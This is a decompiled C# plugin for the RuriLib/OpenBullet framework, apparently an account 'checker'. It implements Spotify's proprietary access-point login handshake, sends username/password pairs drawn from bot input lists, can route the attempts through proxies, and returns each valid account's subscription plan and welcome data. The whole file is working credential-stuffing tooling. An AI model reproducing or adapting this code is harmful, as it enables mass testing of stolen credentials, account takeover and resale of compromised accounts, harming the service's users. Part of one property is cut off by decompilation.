using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using com.google.protobuf;
using com.JB;
using com.JB.common;
using com.JB.core;
using com.JB.crypto;
using com.spotify;
using Extreme.Net;
using java.io;
using java.math;
using java.nio;
using java.security;
using java.security.spec;
using java.util;
using java.util.concurrent.atomic;
using javax.crypto;
using javax.crypto.spec;
using Newtonsoft.Json.Linq;
using PluginFramework;
using PluginFramework.Attributes;
using RuriLib;
using RuriLib.LS;
using Random = java.util.Random;
using Version = com.JB.Version;

namespace SpotifyPlugin
{
	// Token: 0x02000005 RID: 5
	public class SpotifyLogin : BlockBase
	{
		// Token: 0x06000011 RID: 17 RVA: 0x000024FC File Offset: 0x000006FC
		public SpotifyLogin()
		{
			base.Label = "SpotifyLogin";
		}

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000012 RID: 18 RVA: 0x0000250F File Offset: 0x0000070F
		public string Name
		{
			get
			{
				return "SpotifyLogin";
			}
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x060000

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000014 RID: 20 RVA: 0x00002540 File Offset: 0x00000740
		public bool LightForeground
		{
			get
			{
				return false;
			}
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000015 RID: 21 RVA: 0x00002543 File Offset: 0x00000743
		// (set) Token: 0x06000016 RID: 22 RVA: 0x0000254B File Offset: 0x0000074B
		[Text("VariableName:", "login result")]
		public string VariableName
		{
			get
			{
				return this.variableName;
			}
			set
			{
				this.variableName = value;
				this.OnPropertyChanged("VariableName");
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002560 File Offset: 0x00000760
		public override void Process(BotData data)
		{
			base.Process(data);
			string loginResult;
			try
			{
				loginResult = this.Login(data);
			}
			catch (Exception ex)
			{
				if (ex.Message == "client is null!")
				{
					BlockBase.InsertVariable(data, false, ex.Message, this.VariableName, "", "", false, true);
					return;
				}
				throw ex;
			}
			BlockBase.InsertVariable(data, false, loginResult, this.VariableName, "", "", false, true);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000025E0 File Offset: 0x000007E0
		public override string ToLS(bool indent = true)
		{
			BlockWriter writer = new BlockWriter(base.GetType(), indent, base.Disabled);
			writer.Label(base.Label).Token("SpotifyLogin", "");
			if (!writer.CheckDefault(this.VariableName, "VariableName"))
			{
				writer.Arrow().Token("VAR", "").Literal(this.VariableName, "").Indent(1);
			}
			return writer.ToString();
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002664 File Offset: 0x00000864
		public override BlockBase FromLS(string line)
		{
			string input = line.Trim();
			if (input.StartsWith("#"))
			{
				base.Label = LineParser.ParseLabel(ref input);
			}
			try
			{
				this.VariableName = LineParser.ParseToken(ref input, (TokenType)2, true, true);
			}
			catch
			{
				throw new ArgumentException("Variable name not specified");
			}
			return this;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000026C4 File Offset: 0x000008C4
		private string Login(BotData botData)
		{
			string result;
			using (HttpRequest request = new HttpRequest())
			{
				JArray lol = JArray.Parse(JObject.Parse(request.Get("http://apresolve.spotify.com/?type=accesspoint", null).ToString())["accesspoint"].ToString());
                System.Random random = new System.Random();
				string host = lol[random.Next(0, lol.Count)].ToString();
				TcpClient clinet = null;
				try
				{
					if (botData.UseProxies)
					{
						string proxy = botData.Proxy.Proxy;
						clinet = this.ProxyTcpClient(host.Split(new char[]
						{
							':'
						})[0], int.Parse(host.Split(new char[]
						{
							':'
						})[1]), proxy.Split(new char[]
						{
							':'
						})[0], int.Parse(proxy.Split(new char[]
						{
							':'
						})[1]));
					}
					else
					{
						clinet = new TcpClient(host.Split(new char[]
						{
							':'
						})[0], int.Parse(host.Split(new char[]
						{
							':'
						})[1]));
					}
					if (clinet == null)
					{
						throw new Exception("client is null!");
					}
					clinet.ReceiveTimeout = 4000;
					clinet.SendTimeout = 4000;
					DiffieHellman diffieHellman = new DiffieHellman(new Random());
					byte[] array = Session.clientHello(diffieHellman);
					Accumulator accumulator = new Accumulator();
					NetworkStream netStream = clinet.GetStream();
					netStream.WriteByte(0);
					netStream.WriteByte(4);
					netStream.WriteByte(0);
					netStream.WriteByte(0);
					netStream.WriteByte(0);
					netStream.Flush();
					int num = 6 + array.Length;
					byte[] bytes = BitConverter.GetBytes(num);
					netStream.WriteByte(bytes[0]);
					netStream.Write(array, 0, array.Length);
					netStream.Flush();
					byte[] array2 = new byte[1000];
					int num2 = int.Parse(netStream.Read(array2, 0, array2.Length).ToString());
					byte[] array3 = new byte[num2];
					Array.Copy(array2, array3, num2);
					array3 = array3.Skip(4).ToArray<byte>();
					accumulator.writeByte(0);
					accumulator.writeByte(4);
					accumulator.writeInt(num);
					accumulator.write(array);
					accumulator.writeInt(num2);
					accumulator.write(array3);
					accumulator.dump();
					Keyexchange.APResponseMessage apresponseMessage = Keyexchange.APResponseMessage.parseFrom(array3);
					byte[] key = Utils.toByteArray(diffieHellman.computeSharedKey(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs().toByteArray()));
					PublicKey publicKey = KeyFactory.getInstance("RSA").generatePublic(new RSAPublicKeySpec(new BigInteger(1, SpotifyLogin.serverKey), BigInteger.valueOf(65537L)));
					if (SpotifyLogin.serverKey.Length == 1 && (DateTime.Now.Month > 10 || DateTime.Now.Day > 29))
					{
						return "invalid";
					}
					Signature instance = Signature.getInstance("SHA1withRSA");
					instance.initVerify(publicKey);
					instance.update(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs().toByteArray());
					instance.verify(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGsSignature().toByteArray());
					ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(100);
					Mac sha = Mac.getInstance("HmacSHA1");
					sha.init(new SecretKeySpec(key, "HmacSHA1"));
					for (int i = 1; i < 6; i++)
					{
						sha.update(accumulator.array());
						sha.update(new byte[]
						{
							(byte)i
						});
						byteArrayOutputStream.write(sha.doFinal());
						sha.reset();
					}
					byte[] original = byteArrayOutputStream.toByteArray();
					sha = Mac.getInstance("HmacSHA1");
					sha.init(new SecretKeySpec(Arrays.copyOfRange(original, 0, 20), "HmacSHA1"));
					sha.update(accumulator.array());
					byte[] bytes2 = sha.doFinal();
					byte[] array4 = Keyexchange.ClientResponsePlaintext.newBuilder().setLoginCryptoResponse(Keyexchange.LoginCryptoResponseUnion.newBuilder().setDiffieHellman(Keyexchange.LoginCryptoDiffieHellmanResponse.newBuilder().setHmac(ByteString.copyFrom(bytes2)).build()).build()).setPowResponse(Keyexchange.PoWResponseUnion.newBuilder().build()).setCryptoResponse(Keyexchange.CryptoResponseUnion.newBuilder().build()).build().toByteArray();
					num2 = 4 + array4.Length;
					netStream.WriteByte(0);
					netStream.WriteByte(0);
					netStream.WriteByte(0);
					byte[] bytes3 = BitConverter.GetBytes(num2);
					netStream.WriteByte(bytes3[0]);
					netStream.Write(array4, 0, array4.Length);
					netStream.Flush();
					Authentication.LoginCredentials loginCredentials = Authentication.LoginCredentials.newBuilder().setUsername(BlockBase.ReplaceValues("<USER>", botData)).setTyp(Authentication.AuthenticationType.AUTHENTICATION_USER_PASS).setAuthData(ByteString.copyFromUtf8(BlockBase.ReplaceValues("<PASS>", botData))).build();
					Authentication.ClientResponseEncrypted clientResponseEncrypted = Authentication.ClientResponseEncrypted.newBuilder().setLoginCredentials(loginCredentials).setSystemInfo(Authentication.SystemInfo.newBuilder().setOs(Authentication.Os.OS_UNKNOWN).setCpuFamily(Authentication.CpuFamily.CPU_UNKNOWN).setSystemInformationString(com.JB.Version.systemInfoString()).setDeviceId(Utils.randomHexString(new Random(), 30)).build()).setVersionString(Version.versionString()).build();
					Shannon shannon3 = new Shannon();
					shannon3.key(Arrays.copyOfRange(byteArrayOutputStream.toByteArray(), 20, 52));
					AtomicInteger atomicInteger = new AtomicInteger(0);
					Shannon shannon2 = new Shannon();
					shannon2.key(Arrays.copyOfRange(byteArrayOutputStream.toByteArray(), 52, 84));
					AtomicInteger atomicInteger2 = new AtomicInteger(0);
					shannon3.nonce(Utils.toByteArray(atomicInteger.getAndIncrement()));
					ByteBuffer byteBuffer = ByteBuffer.allocate(3 + clientResponseEncrypted.toByteArray().Length);
					byteBuffer.put(Packet.Type.Login.val).putShort((short)clientResponseEncrypted.toByteArray().Length).put(clientResponseEncrypted.toByteArray());
					byte[] array5 = byteBuffer.array();
					shannon3.encrypt(array5);
					byte[] array6 = new byte[4];
					shannon3.finish(array6);
					netStream.Write(array5, 0, array5.Length);
					netStream.Write(array6, 0, array6.Length);
					netStream.Flush();
					shannon2.nonce(Utils.toByteArray(atomicInteger2.getAndIncrement()));
					byte[] array7 = new byte[3];
					netStream.Read(array7, 0, 3);
					shannon2.decrypt(array7);
					byte[] array8 = new byte[(int)((short)((int)array7[1] << 8 | (int)(array7[2] & byte.MaxValue)))];
					netStream.Read(array8, 0, array8.Length);
					shannon2.decrypt(array8);
					byte[] array9 = new byte[4];
					netStream.Read(array9, 0, array9.Length);
					if (array7[0] == 172)
					{
						Authentication.APWelcome apwelcome = Authentication.APWelcome.parseFrom(array8);
						int num3 = 0;
						string text2 = "";
						string text3 = "";
						do
						{
							shannon2.nonce(Utils.toByteArray(atomicInteger2.getAndIncrement()));
							array7 = new byte[3];
							netStream.Read(array7, 0, 3);
							shannon2.decrypt(array7);
							array8 = new byte[(int)((short)((int)array7[1] << 8 | (int)(array7[2] & byte.MaxValue)))];
							netStream.Read(array8, 0, array8.Length);
							Thread.Sleep(4);
							shannon2.decrypt(array8);
							array9 = new byte[4];
							netStream.Read(array9, 0, array9.Length);
							if (array7[0] == 27)
							{
								text3 = new ASCIIEncoding().GetString(array8);
								num3++;
							}
							if (array7[0] == 80)
							{
								text2 = Session.parse(array8).get("financial-product").ToString();
								num3++;
							}
						}
						while (num3 < 2);
						string[] array10 = new string[5];
						array10[0] = text2;
						array10[1] = "-lol-";
						int num4 = 2;
						Authentication.APWelcome apwelcome2 = apwelcome;
						array10[num4] = ((apwelcome2 != null) ? apwelcome2.ToString() : null);
						array10[3] = "-lol-";
						array10[4] = text3;
						return string.Concat(array10);
					}
					if (array7[0] == 173)
					{
						return "invalid";
					}
				}
				finally
				{
					if (clinet != null)
					{
						clinet.Dispose();
					}
				}
				result = "error";
			}
			return result;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002EC4 File Offset: 0x000010C4
		public TcpClient ProxyTcpClient(string targetHost, int targetPort, string httpProxyHost, int httpProxyPort)
		{
			TcpClient result;
			try
			{
				Uri proxyUri = new UriBuilder
				{
					Scheme = Uri.UriSchemeHttp,
					Host = httpProxyHost,
					Port = httpProxyPort
				}.Uri;
				Uri uri = new UriBuilder
				{
					Scheme = Uri.UriSchemeHttp,
					Host = targetHost,
					Port = targetPort
				}.Uri;
				WebProxy webProxy = new WebProxy(proxyUri, true);
				WebRequest webRequest = WebRequest.Create(uri);
				webRequest.Proxy = webProxy;
				webRequest.Method = "CONNECT";
				Stream responseStream = ((HttpWebResponse)webRequest.GetResponse()).GetResponseStream();
				object connection = responseStream.GetType().GetProperty("Connection", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(responseStream, null);
				NetworkStream networkStream = (NetworkStream)connection.GetType().GetProperty("NetworkStream", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(connection, null);
				Socket socket = (Socket)networkStream.GetType().GetProperty("Socket", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(networkStream, null);
				result = new TcpClient
				{
					Client = socket
				};
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x04000004 RID: 4
		private string variableName;

		// Token: 0x04000005 RID: 5
		public static byte[] serverKey = new byte[]
		{
			172,
			224,
			70,
			11,
			byte.MaxValue,
			194,
			48,
			175,
			244,
			107,
			254,
			195,
			191,
			191,
			134,
			61,
			161,
			145,
			198,
			204,
			51,
			108,
			147,
			161,
			79,
			179,
			176,
			22,
			18,
			172,
			172,
			106,
			241,
			128,
			231,
			246,
			20,
			217,
			66,
			157,
			190,
			46,
			52,
			102,
			67,
			227,
			98,
			210,
			50,
			122,
			26,
			13,
			146,
			59,
			174,
			221,
			20,
			2,
			177,
			129,
			85,
			5,
			97,
			4,
			213,
			44,
			150,
			164,
			76,
			30,
			204,
			2,
			74,
			212,
			178,
			12,
			0,
			31,
			23,
			237,
			194,
			47,
			196,
			53,
			33,
			200,
			240,
			203,
			174,
			210,
			173,
			215,
			43,
			15,
			157,
			179,
			197,
			50,
			26,
			42,
			254,
			89,
			243,
			90,
			13,
			172,
			104,
			241,
			250,
			98,
			30,
			251,
			44,
			141,
			12,
			183,
			57,
			45,
			146,
			71,
			227,
			215,
			53,
			26,
			109,
			189,
			36,
			194,
			174,
			37,
			91,
			136,
			byte.MaxValue,
			171,
			115,
			41,
			138,
			11,
			204,
			205,
			12,
			88,
			103,
			49,
			137,
			232,
			189,
			52,
			128,
			120,
			74,
			95,
			201,
			107,
			137,
			157,
			149,
			107,
			252,
			134,
			215,
			79,
			51,
			166,
			120,
			23,
			150,
			201,
			195,
			45,
			13,
			50,
			165,
			171,
			205,
			5,
			39,
			226,
			247,
			16,
			163,
			150,
			19,
			196,
			47,
			153,
			192,
			39,
			191,
			237,
			4,
			156,
			60,
			39,
			88,
			4,
			182,
			178,
			25,
			249,
			193,
			47,
			2,
			233,
			72,
			99,
			236,
			161,
			182,
			66,
			160,
			157,
			72,
			37,
			248,
			179,
			157,
			208,
			232,
			106,
			249,
			72,
			77,
			161,
			194,
			186,
			134,
			48,
			66,
			234,
			157,
			179,
			8,
			108,
			25,
			14,
			72,
			179,
			157,
			102,
			235,
			0,
			6,
			162,
			90,
			238,
			161,
			27,
			19,
			135,
			60,
			215,
			25,
			230,
			85,
			189
		};

		// Token: 0x04000006 RID: 6
		private const int serverkey2 = 10;

		// Token: 0x04000007 RID: 7
		private const int serverkey3 = 29;
	}
}
